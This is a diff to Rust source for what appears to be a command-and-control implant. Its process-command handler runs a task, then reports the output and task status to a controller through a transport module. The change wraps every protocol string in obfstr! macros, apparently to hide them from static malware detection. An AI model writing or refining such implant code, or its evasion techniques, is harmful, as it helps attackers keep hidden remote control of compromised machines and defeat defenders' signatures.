@@ -1,5 +1,6 @@
 use std::process::Command;
 use serde_json::Value;
+use obfstr::obfstr;
 
 pub fn handle_ps_command(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     // extract parameters JSON
@@ -27,13 +28,13 @@ pub fn handle_ps_command(task: &Value) -> Result<(), Box<dyn std::error::Error>>
     crate::helpers::churn(user_output.as_str());
 
     let response = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": task.get("id").and_then(Value::as_str).unwrap_or(""),
-            "user_output": user_output,
-            "timestamp": task.get("timestamp").and_then(Value::as_f64).unwrap_or(0.0),
-            "status": "success",
-            "completed": true
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): task.get("id").and_then(Value::as_str).unwrap_or(""),
+            obfstr!("user_output"): user_output,
+            obfstr!("timestamp"): task.get(obfstr!("timestamp")).and_then(Value::as_f64).unwrap_or(0.0),
+            obfstr!("status"): obfstr!("success"),
+            obfstr!("completed"): true
         }]
     });
     crate::transport::send_request(&response.to_string())?;
